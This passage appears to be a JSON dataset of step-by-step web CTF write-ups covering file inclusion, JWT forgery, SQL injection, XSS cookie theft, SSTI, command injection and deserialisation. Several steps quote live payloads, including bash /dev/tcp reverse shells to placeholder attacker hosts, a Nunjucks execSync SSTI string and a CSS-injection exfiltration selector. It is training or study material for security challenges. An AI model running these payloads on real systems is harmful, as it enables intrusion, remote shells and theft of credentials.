[
    "Visited the website and got redirected to '/?file=wc.php'",
    "Visited '/?file=/etc/passwd' to confirm server-side file inclusion",
    "Discorded a 'robots.txt' file at '?file=robots.txt' revealing the existence of 'checkpass.php'",
    "Visited '/?file=checkpass.php' and realized the page contained some secret potentially usable code",
    "Used 'php://filter' to view the source of 'checkpass.php' and discovered the password 'w0rdc0unt123'",
    "Used 'php://filter' again and de-coded base64 strings to see the source code of 'wc.php'",
    "Plugged the password ('w0rdc0unt123') from '$password' variable to the cookie and accessed the webpage",
    "Found out that the user input '$text' from get param 'text' was passed into 'exec' leading to potential remote code execution",
    "Tried the payload '; ls #'",
    "Realized 'echo exec(...)' only returns the last line of the output",
    "Tried to spawn a reverse shell with '; bash -c \"bash -i >& /dev/tcp/your.server.ip.address/8000 0>&1\" #'",
    "Used the shell access to browse the file system and found a folder '/ctf'",
    "Identified notable shell script 'findaas' inside '/ctf'",
    "Located 'flag.txt' using './findaas flag.txt'",
    "Attempted to read the flag using 'cat ./system/of/a/down/flag.txt' but was denied permission",
    "Read the 'README' file and found a password hash '6f246c872cbf0b7fd7530b7aa235e67e'",
    "Decoded the password hash to find password 'csictf'",
    "Switched to the user 'ctf' using the password 'csictf'",
    "Printed the flag using 'cat ./system/of/a/down/flag.txt'",
    "Locate routes to '/login' and '/adminNames' in the website source.",
    "Visiting the '/login' route presents a form to fill.",
    "Submit form and monitor the Network Tab responses for a JWT in the 'token' header.",
    "Decode the JWT, e.g., at jwt.io, revealing a payload with 'username', 'password', and 'admin' keys.",
    "Note that the 'username' from the form inputs has undergone rot13 encoding to appear in the decoded JWT.",
    "Apply rot13 decoding on the 'admin' value, which returns 'false'.",
    "Form the intention to alter the decoded 'admin' value to a rot13-encoded 'true', which would require the JWT secret.",
    "Navigate to '/adminNames', which prompts a file download containing a GitHub URL.",
    "Visit the GitHub URL, which leads to a list of website admin usernames.",
    "Prepare to alter the JWT 'username' to the rot13-encoded version of a listed admin username.",
    "Seek the JWT secret by examining the request route for '/adminNames', i.e., '/getFile?file=admins'.",
    "Experiment with the '/getFile?file=...' route, e.g., by replacing 'admins' with '.env' or '../.env'.",
    "Download the '.env' file, which contains the JWT secret.",
    "Create a new token using the JWT secret and the altered payload (admin username and 'true' admin status).",
    "Visit the '/admin' route, monitoring the response for headers requiring a token.",
    "Identify the need for an 'Authorization' header containing a JWT.",
    "Send a GET request with the correct 'Authorization' header using the new token to authenticate.",
    "Receive a response text containing the flag in rot13 encoding.",
    "Decode the flagged text via rot13 to reveal the true flag.",
    "Read the challenge description and requirements, the vulnerability lies in Express query parsing",
    "Study source files, specifically server.js",
    "Identify that files retrieved need to pass certain conditions: no spaces or slashes in filename, filename length five or less, and only js, ts, cpp, c files allowed",
    "Infer that the flag is inside a `flag.txt`, needing to bypass filename restrictions to get it",
    "Note that when an array is passed in 'file' GET parameter, it gets converted and concatenated into a string with comma separation for each element. This also passes the filename restrictions",
    "Note that '.' and 'js' have to be the last two elements of the array to pass the file type check",
    "Construct a parameter that both meets the conditions and requests the flag file. `['a', 'b', 'c', 'd', '/../flag.txt', '.', 'js']` is passed in an array via the GET parameter so that only the first five elements are used to create the file name, which then resolves to `flag.txt` after the process",
    "Send the GET request `/getFile?file[]=a&file[]=b&file[]=c&file[]=d&file[]=/../flag.txt&file[]=.&file[]=js` to the server",
    "Retrieve the flag from the server response: `csictf{5h0uld_5tr1ng1fy_th3_p4r4ms}`",
    "Search the challenge description online, finding a quote from Mr. Robot that signifies checking out the website's 'robots.txt'",
    "Opened the website, which served an 'index.html' file containing information about 'Brobot', understood as another hint towards 'robots.txt'",
    "Accessed 'robots.txt', discovered a disallowed route '/fade/to/black'",
    "Visited the disallowed route and obtained the flag",
    "Access website, identify cookie related to flavor",
    "Decode the cookie using base64 decoding",
    "Replace the existing flavor value in the cookie with 'chocolate'",
    "Encode new cookie value into base64",
    "Replace the original cookie with the new base64 encoded 'chocolate' cookie on the website",
    "Retrieve the flag",
    "Analyzed the secure portal page source",
    "Deciphered that the JavaScript in the source code was obfuscated",
    "Noted that the password for the portal is being checked by the script",
    "Translated the hex-encoded list, var _0x575c, into a more readable format",
    "Understood many calls to 'window' were made in the CheckPassword function, which essentially represented 'window.localStorage.setItem'",
    "Understood that the password was split into various parts and stored against assigned keys",
    "Used 'window.localStorage.getItem' similar to 'window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]]' to check our input password against the split parts",
    "Combined all password parts into a single string",
    "Entered the combined password into the portal",
    "Accessed URL to start the CSS Injection challenge",
    "Found an input box where a color could be entered and it was applied after clicking submit",
    "Identified a hidden field 'password' where the value was taken from the cookie",
    "Inserted 'blue}; input[type=\"password\"][value^=\"c\"] {background-image: url('https://example.com?c');' into the color input field to test CSS injection and extracting the first character of the password",
    "Submitted a series of CSS selectors for all potential starting letters of the password, one at a time, to identify the starting letter",
    "Used iterative deepening to discover each subsequent character of the password by injecting similar code into the input box with an updated prefix",
    "Injected CSS through the input box, guessing combinations of characters until the entire password was revealed",
    "Passed the final payload '/admin' to extract the admin cookie 'password', which was the flag",
    "Analyzed the server script running at the provided URL, observing that it takes user input as the 'icecream' value and uses a secure cookie for comparison to display a flag value.",
    "Visited the URL with the payload '?icecream={{globals()}}', discovering the variable name 'application' linked to the tornado.web.Application object.",
    "Ran the server script with a new payload '?icecream={{application.settings[\"cookie_secret\"]}}' to retrieve the cookie_secret value 'MangoDB'.",
    "Adjusted the value of the secure cookie 'admin' to the desired comparison value 'true' to create a signed cookie in the browser.",
    "Replaced the original signed cookie with the new one generated when the secure cookie value was changed to 'true'.",
    "Reloading the server script successfully changed the website content from the original message to the target flag value 'csictf{h3r3_i_4m}'.",
    "Review the given PHP code to understand what it does",
    "Notice that to match the value of 'hash' and 'target', the 'hash' param cannot equal '10932435112'",
    "Realize that the sha1 hashes of 'hash' and 'target' will not match, so brute forcing is not a viable option",
    "Identify that the '$hash' and the '$target' are matched using '==' instead of '===' and therefore vulnerable to type juggling",
    "Identify that the sha1 hash of '10932435112' starts with '0e...'",
    "Understand that any other sha1 hash starting with the same prefix will match the target due to type juggling",
    "Identify hashes through brute forcing that start with the '0e' prefix and thus match the target",
    "Pass any one of these hashes with the GET parameter 'hash' to the server",
    "Retrieve the flag from the server",
    "Followed the challenge description and noted the use of the 'flask_caching' module for the app",
    "Researched and found that the 'flask_caching' module can optionally store a python pickle in redis with a prepended '!'",
    "Learned that python pickles can be used for Remote Code Execution when the caching modules use 'pickle.load()' to load the cached data",
    "Set up a netcat listener on my server",
    "Wrote a script which: constructs a command to be executed, creates a payload using python pickle containing a command execution statement, sleeps for half a second, reads the just created payload, and then sends it to the challenge webpage URL using a POST request",
    "Used a GET request to access the cache data that triggers the command execution on the server side",
    "Observed the output on my netcat listener, which included the CTF flag",
    "Confirmed the challenge 'Gif2png' requires interaction with a Flask application.",
    "Identified the source code of the application that by analyzing a Python script.",
    "Focused on the command line subprocess interaction in this line: 'subprocess.Popen(f\"ffmpeg -i 'uploads/{file.filename}' \\\"uploads/{uid}/%03d.png\\\"\", shell=True)'.",
    "Identified the above critical line that could potentially lead to Remote Command Execution (RCE) through its interaction with the filename being uploaded.",
    "Started preparing an attack by attempting to exploit the RCE vulnerability by using the '-vf drawtext=...' option within the 'ffmpeg' command in the application to inject a 'grep' command to look for the flag in the main.py file.",
    "Crafted a payload for this on the form 'csictf.gif' -vf drawtext=\\\"text=$(grep ffLaG main.py)\\\"'.gif'. The crafted payload was intended to be used as the filename of the gif file being uploaded.",
    "Uploaded the gif with the crafted filename to the application.",
    "Analyzed the resulting PNG file from the uploaded and converted gif and found the flag written on it.",
    "Extracted the flag, which turned out to be 'cybrics{imagesaresocoolicandrawonthem}'.",
    "Access the source URL in the browser",
    "Open the Browser Devtools to view the website's source code",
    "Locate the function addCaptcha() in the JavaScript code, this function creates the captchas and makes them move",
    "Modify the function addCaptcha() in your devtools, remove the loop() function to stop the captchas from moving",
    "Call the function addCaptcha() manually to add 5 captchas on your screen",
    "Click the captcha boxes until you successfully get all 5 captchas",
    "After collecting all 5 captchas, click on 'GET FLAG' to obtain the challenge flag",
    "The flag is displayed on the screen, copy it",
    "Open link 'very.uniquename.xyz:8880'",
    "Interpret challenge hint and guess that language setting may be relevant to solve puzzle",
    "Deducing from the image that the language might be Swedish",
    "Use cURL tool to set language headers to Swedish",
    "Use command: 'curl -H \"Accept-Language: sv-SE\" very.uniquename.xyz:8880'",
    "Upon running this command, retrieve the flag 'dsc{1_l0v3_sw3d3n}'",
    "Opened link 'very.uniquename.xyz:2052', observed the page showing logos of Xbox and Linux",
    "Changed User-Agent to 'Linux' via a curl command",
    "Observed the result and noticed the Linux logo was gone from the page",
    "Changed User-Agent to 'Linux Xbox' using curl",
    "Received the flag in the body of the returned page",
    "Open link 'overly.uniquename.xyz:2095' in web browser",
    "Change the HTTP method to POST using cURL",
    "Change the 'User-Agent' header to that of a Google bot",
    "Set the Referer as 'google.com'",
    "Set the Host as 'dscvit.com'",
    "Set the cookie as 'user=root'",
    "Set the Content-Type as 'application/json'",
    "Add data to the HTTP request specifying a JSON object '{\"foo\":\"bar\"}'",
    "After receiving error, add 'messi' to JSON object as a key",
    "After receiving another error requesting information on Messi's club, change the 'messi' key value to 'psg'",
    "Flag obtained: 'dsc{th15_15_w4y_t00_much_w0rk}'",
    "Starting point of the code, it's a SQL Injection attack and for domain they used a combination of uppercase, lowercase, numbers, underscore and curly braces",
    "Author defined a conditional statement, if the challenge is 'taxi union', certain variables are initialized with specific values",
    "If the challenge is 'Gate keeper', specific values are assigned to the same variables, like url and check",
    "The execution enters a while loop, where the code iterates over every character in the domain to build up the 'payload'",
    "In the loop, the 'payload' is created in the format of a SQL statement with an OR operator to guess the next character in the password",
    "A POST request is sent to the server with the 'payload' as the data",
    "If the response contains the 'check' string, that means the guess was correct and the character is appended to the 'flag' and the process continues",
    "If the guessed character is not in the password, the loop continues with the next character",
    "The script continues in this way until the full password is discovered",
    "Opened the given link",
    "Checked the network tab and found a response header",
    "Sent a curl request, setting the cookie to a given string",
    "Received a response containing a new flag value",
    "Sent another curl request, this time, setting the new flag value as the cookie",
    "Received another response containing a different flag value",
    "Decided to write a script to automate this",
    "The Python script made GET requests, changing the cookie flag each time, until a termination condition 'EOF' is met",
    "Obtained a sequence of hexadecimal values, which seemed to be MD5 hashes",
    "Decrypted the MD5 hashes to reveal a string",
    "Noticed that the decrypted string formed a flag when the chunks were concatenated",
    "Step 1: The author identifies it as a SQL Injection challenge and sets up the environment to exploit it.",
    "Step 2: Para meters and values such as 'domain', 'check', 'key', and 'column' are initialized to be manipulated later.",
    "Step 3: The author sets a condition to set these parameters based on the specific challenge, as this solution also works for the 'Gate Keeper' challenge.",
    "Step 4: While the condition to receive the CTF password (flag) not met, the script will continue iterating.",
    "Step 5: In each iteration, the author forms SQL Injection payload with progressively appended characters from the 'domain'.",
    "Step 6: The payload is sent to the target URL via POST request. The data content for the request is constructed dynamically with the key-value pair where the key is retrieved from the 'key' variable and the value is the payload.",
    "Step 7: A check is performed to see if the response text contains 'check', a predefined string that is expected in the response of the successful login.",
    "Step 8: If the check is successful, it indicates that the payload was able to pass through SQL Injection leading to valid login and the iterated character is added to 'flag'.",
    "Step 9: The 'flag' value updates with the successful character, and it repeats the process until the end of the flag is found.",
    "Analyzed the source code of the web application and noticed that body-parser is set to allow arrays and objects",
    "Noticed that the output in the /login POST route has not been stringified, which gives the possibility to pass an object in the query statement",
    "Studied the official `mysql` docs to understand how objects are handled",
    "Inferred the username to be michelle from the code",
    "Attempted to pass an object in place of password, with a known attribute",
    "Submitted this payload 'csrf&username=michelle&password[username]=michelle' which makes password an object",
    "Understood that objects are converted into comma separated attributes",
    "Understood that this works as 'password' = 'username' evaluates to 0 and then 0 compared with 'michelle' returns true",
    "Used this exploit to log in",
    "Executed curl command to make a POST request to the /login with the payload",
    "Extracted the session cookie from the response headers",
    "Used the session cookie to visit /flag and collect the flag",
    "Alternatively, wrote a python script that automates the process of sending the POST request, extracting the cookie and getting the flag",
    "Visiting the website and finding a cookie that contains a JWT hashed with HS256.",
    "Using rockyou.txt to brute force the JWT secret with John The Ripper.",
    "Discovering the secret to be 'supersecret'.",
    "Creating a JWT with 'username: admin'.",
    "Adding the new JWT to the cookie to impersonate an admin.",
    "Visiting a non-existent route starting with '/admin/' to trigger a 404 error page, discovering a template injection vulnerability.",
    "Exploiting the template injection vulnerability to climb the Python MRO (Method Resolution Order) hierarchy and listing all usable classes.",
    "Finding the 'subprocess.Popen' class at index 405.",
    "Using the 'subprocess.Popen' class to spawn a reverse shell.",
    "Starting a 'netcat' listener on your server at the specified port.",
    "Gaining a shell and listing the directory.",
    "Finding the flag in a file named 'flag.txt'.",
    "Connect to the URL provided in the challenge http://jh2i.com:50000",
    "Interpret the hint provided: 'We will only give our flag to our Agent 95! He is still running an old version of Windows...', implying that the User Agent in the request header needs to be one that matches Windows 95",
    "Change the User-Agent header in the request to 'Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)'",
    "Send a GET request to the URL using the modified User-Agent using Python's requests library",
    "Inspect the returned data to retrieve the flag, which is 'flag{user_agents_undercover}'",
    "Visited the given URL on the browser",
    "Opened browser dev tools and observed the local storage",
    "Noticed a JS file 'jquery.jscroll2.js' in sources",
    "Converted hex to string from 'line 1' of the JS file with a Python script",
    "Analyzed the converted code 'window['localstorage']['setItem']('flag', atob('SkNURntzcG9vb29va3lfZ2hvc3RzX2luX3N0b3JhZ2V9'))'",
    "Understood that the script converts the base64 string 'SkNURntzcG9vb29va3lfZ2hvc3RzX2luX3N0b3JhZ2V9' and stores it in local storage with the key 'flag'",
    "Converted the base64 string 'SkNURntzcG9vb29va3lfZ2hvc3RzX2luX3N0b3JhZ2V9' to ASCII using terminal",
    "Obtained the flag: 'JCTF{spoooooky_ghosts_in_storage}'",
    "Open the provided URL: https://redpwn.net/",
    "Press `Ctrl + U` on your browser to view the source code of the HTML file.",
    "Search for a string formatted like this: `flag{...}` in the HTML source code.",
    "Identify the flag in the meta tag: ```<meta name=\"redpwnctf2020\" content=\"flag{1nspector_g3n3ral_at_w0rk}\">```",
    "Copy the flag found in the content attribute: `flag{1nspector_g3n3ral_at_w0rk}`",
    "Visited the source URL provided for the challenge.",
    "Identified the challenge as a beginner SQL Injection challenge.",
    "Inferred from the knowledge of SQL Injection that the username and password input can be manipulated.",
    "Injected a classic SQL Injection payload (' or 1=1 -- ) into the username and password fields.",
    "Due to the SQL Injection, authentication was bypassed by making the conditional statement in the SQL query always true.",
    "Upon successful injection, the website returned an alert with the flag in it.",
    "Read the flag from the alert.",
    "Recognize that the function for generating a token is creating it by injecting variables directly into a string, rather than by using object properties.",
    "Identify that the 'member' field is currenctly set to 0.",
    "Understand that by carefully crafting the input for the 'username', you can close the double-quote allowing you to manipulate the following fields in the token.",
    "Pass the username as ','\"member\":\"1', which changes 'member' to a non-zero value.",
    "Visit '/api/flag' with modified token.",
    "Retrieve the flag.",
    "First, trying to inject a random '<h1>Hello</h1>' tag to check for HTML input acceptance",
    "Looking at the JavaScript file in the webpage found that the content is retrieved from the URL in base64 format and HTML tags are not allowed",
    "Devising a payload that can bypass the bracket-based sanitization by adding an extra '>' in the start. This exploits the arbitrary JavaScript execution via a broken image tag's onerror handler",
    "Encoding the payload in base64 and adding it to the URL",
    "Setting up a netcat listener on a local server to capture incoming connections",
    "Submitting the crafted URL to the Admin Bot, which visits the URL causing the XSS payload to execute",
    "Capturing the Admin Bot's cookies sent by the executed payload to the netcat listener",
    "Extracting the flag from the Admin Bot's cookies",
    "Notice that the challenge is about Cross-Site Scripting (XSS) on a website which allows HTML input",
    "Identify that URL of the created webpage is a base64 encoded form from the content of the page",
    "Observe that the JavaScript code prevents 'script' tags and allows only certain attributes for an element",
    "Craft an XSS payload that utilizes the specified attributes to redirect and assign the document's cookie to the query parameter of a specified URL",
    "Ensure the site URL in the payload is using HTTPS to prevent Content Security Policy Bypassing",
    "Generate a webpage with the XSS payload by sending it to the website",
    "Set up a simple Node.js server backend to receive and log the cookie transferred as a query parameter",
    "Send the generated webpage URL with the XSS payload to the 'admin bot'",
    "Intercept the bot's browser cookie when it visits the sabotaged webpage",
    "Retrieve the flag stored in the intercepted cookie",
    "Noticed the keywords 'page' and 'upload' on the webpage sourced from the author of the CTF challenge",
    "Viewed homepage source to find a comment prompting the user to 'get the page'",
    "Tried passing a page query in the flag by visiting 'http://web.zh3r0.ml:7777/?page=flag', and received a gif in response",
    "Checked if a 'upload' page existed due to its mention in the challenge description and found it did",
    "Assumed a Local File Inclusion (LFI) exploitation was required due to the upload page validation",
    "Created a PHP file named 'payload.php' that listed all directory files to check for 'flag' files",
    "Decided to print all file contents and search for the flag on the browser due to received multiple 'flag' files",
    "Visited route '/?page=payload' with the uploaded PHP file to find a lot of printed information",
    "Opened source code of the webpage and searched for the flag format",
    "Found the flag 'zh3r0{h3y_d1d_y0u_upl04d_php_c0rr3ct1y???_84651320}' in the source code",
    "Access the provided source code and link to the running instance upon starting the challenge instance.",
    "Examine the website interface, which includes a login screen and a main screen with book selections.",
    "Analyze key aspects of the code, such as JwtService.java and SecretGenerator.Java, to better understand the website's security processes.",
    "Identify that the 'secret key' is '1234', which yields information for encoding and decoding JWT tokens.",
    "Utilize the Google Chrome Network tab to login with given credentials, and capture the payload of the response, which includes a JWT token",
    "Copy the JWT token and decode it using a website such as jwt.io to obtain a 'userId', in this case observed to be '1'.",
    "Encode a new JWT token with role 'Admin'.",
    "Examine the file UserController.java in the 'controllers' directory to discover useful endpoints.",
    "Use Postman, or a similar tool, to send requests with the new 'Admin' JWT token to update the user role and access the flag.",
    "Create a new user on the site since the default user role cannot be modified.",
    "Send a request to obtain a list of users and identify the new user's id.",
    "Send a request to patch the new user's role to 'Admin'.",
    "Login with the newly promoted 'Admin' user and access the book containing the flag.",
    "After start of the instance, the site provides a link to the running instance",
    "Site has a login screen",
    "An attempt is made to login using 'user' username and 'user' password, resulting in a visible SQL query for the login request",
    "Using the visible SQL query as a hint, input 'or 1=1;--' is entered into the 'pass' field to bypass login",
    "The SQL command is modified as 'SELECT id FROM users WHERE password = '' or 1=1;--' and username = '123'",
    "Various SQL queries are tested to determine the type of database used",
    "The query '123' UNION SELECT 1, sqlite_version(), 3;--' reveals that the site is using SQLite",
    "All tables are listed using the query '123' UNION SELECT name, sql, null from sqlite_master;--'",
    "The flag is retrieved using the query '123' UNION SELECT flag, null, null from more_table;--'",
    "Received a link to a running instance of the challenged web project from picoCTF after starting the instance.",
    "Analyzed the web page and noticed the tag `XXE` for `XML external entity`.",
    "Inspected the static resources of the web page from the developer tools in the browser (F12 -> Sources in Google Chrome) and noticed two javascript files: 'detailsCheck.js' and 'xmlDetailsCheckPayload.js'.",
    "Concluded that the challenge involves XML External Entity (XXE) from the use of the `XXE` tag and the 'xmlDetailsCheckPayload.js' file.",
    "Identified the endpoint for the POST request from the index.html file.",
    "Checked the format for XML POST request by clicking a button on the website and examining the request format in the 'Network' tab of the developer tools.",
    "Crafted a malicious XML payload to exploit XXE and read the /etc/passwd file.",
    "Sent a `POST` request to '<url_of_site>/data' with the crafted XML payload.",
    "Captured the flag from the server's response to the malicious `POST` request.",
    "Identified the application can upload TPL files",
    "Uploaded a file with the .tpl extension and a random content for identification",
    "Observed that the uploaded file triggers a POST to /upload.php and then redirects with 302 Found to the /index.php, with the file content displayed",
    "Uploaded a different file to observe the changes in the content",
    "Tried uploading a valid PHP file",
    "Conducted experiments with different content and observed the server's response which suggested Server Side Template Injection",
    "Applied a payload that reveals some useful information about the server environment and file structure",
    "Discovered the smarty-4.0.1 PHP library and the templates_c folder through investigation",
    "Accessed the template files on the server and obtained their content",
    "Leaked the source code of PHP with a payload",
    "Discovered the flag within the source code",
    "Explored the site using ZAP Proxy",
    "Found paths /, /logout, /login, /forgotpassword.html, /admin, and /dashboard; /login and /forgotpassword.html were especially interesting",
    "Attempted to login with 'admin', 'admin' as username and password, which was not possible",
    "Checked the forgot password feature, which revealed a snippet of JavaScript code containing database credentials and a 'JSESSIONID' cookie",
    "Connected to the database using the credentials from the JavaScript code",
    "Examined the different database schemas and tables: accounts, config, env, innodb, sys, users",
    "Found a flag in the 'users' schema, and various other important details in other schemas",
    "Used the AWS credentials found in the 'config' schema to download the contents of an Amazon S3 bucket",
    "Analyzed the Tomcat log found in the S3 bucket, which revealed another flag and a GitHub repository",
    "Cloned the GitHub repository using a private SSH key retrieved from the database",
    "Examined the source code of the challenge present in the cloned repository, discovered a Dockerfile",
    "Looked for potential Apache Tomcat vulnerabilities, but only found a minor one",
    "Checked for possible exploitations in the Java Servlet and found that it was vulnerable to log4j 2.14.1",
    "Attempted to exploit the log4j vulnerability using the 'ProfileServlet.java' and a malicious cookie value",
    "Tried to get the flag using the code provided when exploiting the log4j vulnerability",
    "Downloaded the code for the app and examined the contents",
    "Discovered a package vulnerability in node-serialize from npm install warnings and checking npm audit",
    "Researched 'Code Execution through IIFE in node-serialize' advisory and what IIFE is",
    "Attempted to start the app locally with `npm run start` and encountered an error due to permissions",
    "Examined server code and discovered `const port = process.env.PORT || 80` line, clarifying how to start the app locally using a non-privileged port",
    "Started the app with `PORT=8080 npm run start` and noted the creation of a `storage.db` file",
    "Opened the `storage.db` file with a SQLite database reader to view stored data",
    "Examined the application's source code, specifically routes: `index.js`, `login.js`, `logout.js`, and `signup.js`",
    "Identified a dangerous `unserialize()` function used in the index route that decodes a user's cookie",
    "Tested the ability to execute a malicious payload via the `unserialize()` function in a test JavaScript file",
    "Corrected a mistake in the test where the payload was executed before serialization instead of after",
    "Created a proper payload that reads the flag file via the file system and returns the flag as the username - to be displayed on the welcome page",
    "Created the finalized payload, crafted directly into a representation of a session cookie that would be expected by the application",
    "Applied the payload to the live environment via the session cookie, resulting in the successful retrieval of the flag",
    "Identify the app is a page with a form to create users which indicates if they are admins",
    "Download the source code provided by the challenge",
    "Identify the app is a Node.js TypeScript app written with Next JS",
    "Spot a handler function in the 'auth.ts' file that stores the request body object into a database",
    "Notice the requests being made to the API endpoint carrying a 'username' attribute",
    "Discover a schema file 'schema.prism' with a 'User' model that comprises an 'isAdmin' field set to 'false' by default",
    "Send a customized request body where the 'isAdmin' field is set to 'true' to get the flag",
    "Identified the application as a WordPress site where some links are clickable and reveal 2 blog posts",
    "Found blog post page '?p=1' where we can leave a comment",
    "Noticed that comments need to be approved as indicated by the change in the URL after submitting a comment",
    "Attempted Cross-site Scripting (XSS) attack, which failed due to the site removing <script> tags",
    "Decided to examine the source code of the page closely using an Integrated Development Environment (IDE)",
    "Identified suspicious JavaScript named 'mec-frontend' and some settings related to a calendar",
    "Observed two <link> tags that appeared unusual",
    "Identified 'mec' as relating to a WordPress Plugin 'Modern events calendar' and found its webpage",
    "Discovered two exploits related to the 'Modern events calendar' plugin in the exploit database",
    "Identified the first exploit as unusable as it required authentication",
    "Tried the second exploit which also seemed to be ineffective",
    "Accessed the site and noticed command execution based on the URL parameter, 'host'.",
    "Set 'host' parameter in URL to '127.0.0.1;cat /etc/passwd' to list the contents of '/etc/passwd'.",
    "Tried to inject '127.0.0.1;bash -c bash -i >& /dev/tcp/<attack-ip-with-netcat-open>/<attacker-netcat-port> 0>&1' to open a reverse shell but failed.",
    "Attempted '127.0.0.1;ls .' in the URL but only 'index.php' was returned.",
    "Used '127.0.0.1;echo $PWD' in URL to reveal current directory as '/var/www/html'.",
    "Used '127.0.0.1;env' in URL to list environment variables, but found no useful information.",
    "Tried '127.0.0.1;ls /root' in URL but no output was returned.",
    "Failed at multiple attempts to get reverse shell using 'bash -i >& /dev/tcp/<ATTACKER-IP>/<ATTACKER-PORT> 0>&1' as a command.",
    "Attempted opening a webshell due to failure of getting a reverse shell.",
    "Restarted the container as attempts to open a reverse shell modified the PHP file and caused problems.",
    "Searched for the flag using 'ls /' which revealed a 'flag.txt' file.",
    "Read the contents of 'flag.txt' by using the command 'cat /flag.txt' as part of the URL parameter.",
    "Observe the name and text of the challenge which refers to 'robots'",
    "Attempt to open 'robots.txt' on the website",
    "Identify the disallowed path '/g00d_old_mus1c.php' in the 'robots.txt' file",
    "Open '/g00d_old_mus1c.php' path to reveal the flag",
    "Observed that Baby Eval is a Node app with a path / that lists information including server source code",
    "Analyzed the source codes provided and determined that the webpage is created by either executing an eval from a payload query parameter or calling the directory() function with specific parameters",
    "Understood that the goal of the CTF challenge is to fetch the environment variable 'flag'",
    "Realized that 'eval' can be triggered by entering a payload as the GET query parameter",
    "Discovered that the code uses a blacklist Regex to prevent the execution of certain strings or functions",
    "Observing that parentheses and some keywords were blocked, searched a way to call a function without parentheses",
    "Found a JavaScript feature called Template Literals that can be used to call functions without parentheses",
    "Wrote a payload using this Template Literal method to directly call the directory function with 'flag' as its parameter",
    "Appended this payload '?payload=directory`flag`' to the URL of the webpage",
    "Concluded that the directory function then receives an array with a single string 'flag' as an argument, which by the function's design returns the value of the 'flag' environment variable",
    "Understand the 'vsCAPTCHA' app written in TypeScript and Deno.",
    "Interpret that 'b1' and 'b2' are initialized with a random number from 0-500.",
    "Understand that the app works by listening to 'POST' requests in '/captcha'.",
    "Check if the Header 'x-captcha-state' is set.",
    "Check if the body JSON value 'solution' is equal to the expected CAPTCHA.",
    "Understand that if the expected value does not match 'solution', the JWT field 'failed' is set to 'true'.",
    "Understand that if the expected value does match, a new CAPTCHA is generated.",
    "Realize that the flag can be attained with more than 1000 CAPTCHA solves.",
    "Understand the CAPTCHA generating code, which uses random numbers to make the CAPTCHA text.",
    "Attempt a brute-forcing approach by trying out all remaining expected values.",
    "Identify the problem with brute force: JWT success counter is reset to 0 if the old token is invalid and expiry was not extended for failed solving attempts.",
    "Work out bugs in the Python code.",
    "Attempt to refactor the code and limit the try range.",
    "Consider another solution of predicting the random numbers generated since they are not cryptographically secure.",
    "The website allows us to view some properties about a Linux system. The output looks just like standard Linux commands. The output of the 'List Storage' command seems to be executing 'df -h'.",
    "Guessed that this was a command injection challenge and tried accessing 'http://IP:PORT/?command=ls' to see if could list the contents of the current directory. This confirmed that it was indeed a command injection challenge.",
    "In the source code, observed that 'shell_exec' is used to run the 'santa_mon.sh' script. Our input in the 'command' URL parameter is then appended to '/santa_mon.sh' so that the final command looks like '/santa_mon.sh [COMMAND PARAMETER INPUT]'. Noted that the 'sanitize' function is called on our input, which removes spaces.",
    "Viewed the source code of the 'santa_mon.sh' program. Observed that the buttons in the web interface do indeed run standard Linux commands. Also saw that if there is an argument to the program, it is executed as a command.",
    "Discovered that 'ups_status' and 'restart_ups' commands return the output from a local web server using curl. Checked the output of the 'List Processes' command and found 'python3 /root/ups_manager.py'. Reviewed the source code for 'config/ups_manager.py'. This file runs an HTTP server with the two endpoints accessed by the 'ups_status' and 'restart_ups' commands - it also has a '/get_flag' endpoint that prints the flag.",
    "Decided to craft a command injection payload without using spaces to run 'curl http://localhost:3000/get_flag' which in turn will return the output to us through the webpage.",
    "Double quoted the payload for PHP to treat our payload as a single string argument, resulting in '/santa_mon.sh \"curl http://localhost:3000/get_flag\"', consequently executing the desired command and getting the flag output from the server.",
    "The final payload was `http://IP:PORT/?command=%22curl${IFS}http://localhost:3000/get_flag%22`.",
    "Examining the source code found that both 'RS256' and 'HS256' algorithms are allowed for decryption in 'challenge/helpers/JWTHelper.js' indicating a potential JWT exploit (CVE-2016-5431/CVE-2016-10555).",
    "Made an account on the website to get the JWT Token and public key by copying the 'session' cookie in the browser's developer tools.",
    "Used JWT.io or jwt_tool.py to decode the cookie.",
    "The public key was found to be encoded in the JWT.",
    "Modified the JWT to use the RS256-to-HS256 exploit to gain access as an admin user.",
    "Used python3 jwt_tool.py to perform the RS256-to-HS256 exploit.",
    "Swapped the JWT token with the admin token in the browser's developer tools to gain admin access.",
    "Found potential Server-Side Template Injection (SSTI) vulnerability in 'challenge/routes/index.js' and 'challenge/helpers/CardHelper.js'.",
    "Exploited the vulnerability using ninjucks SSTI to read the flag from the '/flag' file by adding the payload '{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat /flag*')\")()}}'",
    "The website is a simple login page.",
    "Looking at the source code, identified that the `database.sql` file contains password hashes for a manager and admin user.",
    "Used CrackStation to identify the passwords for the hashed passwords, resulting in credentials `manager:bigsanta!` and `admin:tryharder`.",
    "Logged in using `manager:bigsanta!` credentials but `admin:tryharder` credentials were not valid.",
    "After login, saw a list of toys and some other properties.",
    "Reviewed the source code in `database.sql` file and identified that the flag was in the database with the rest of the toys, with its approved value set to 0 instead of 1.",
    "In `challenge/routes/index.js`, found that the `/api/toylist` endpoint would set `approved` to 1 unless the logged in user is `admin`, indicating that to access the flag, we needed to log in as admin.",
    "Reconsidered the source code and realized that the user authentication process could be vulnerable to a SQL injection.",
    "Attempted various SQL injection payloads on the login page from [swisskyrepo/PayloadsAllTheThings GitHub repository.",
    "Found a working payload with username `admin' -- ` and any password, which revealed the unapproved toy containing the flag: `HTB{1nj3cti0n_1s_in3v1t4bl3}`.",
    "Examine the 'challenge/index.js' file in the source code zip.",
    "The application connects to a sqlite database ('const db = new Database('toy_workshop.db');'), so inspect 'database.js'.",
    "'database.js' lets you add and read items from the database. The query variable control is possible via the website, but SQL injection is unsuccessful.",
    "Examine the 'challenge/routes/index.js' file. We find an '/api/submit' endpoint which the frontend sends user data.",
    "This function adds our user provided query to the database and then calls 'bot.readQueries(db)'.",
    "We cannot reach the '/queries' endpoint as the IP address required is 127.0.0.1, any other IP is redirected to '/'.",
    "Inspect 'challenge/bot.js' to understand 'bot.readQueries(db)' function. It reveals that the bot imports puppeteer, a headless browser controlled via JavaScript, holds the flag, loads the application home page, sets the 'flag' cookie, visits the '/queries' endpoint, and then exits.",
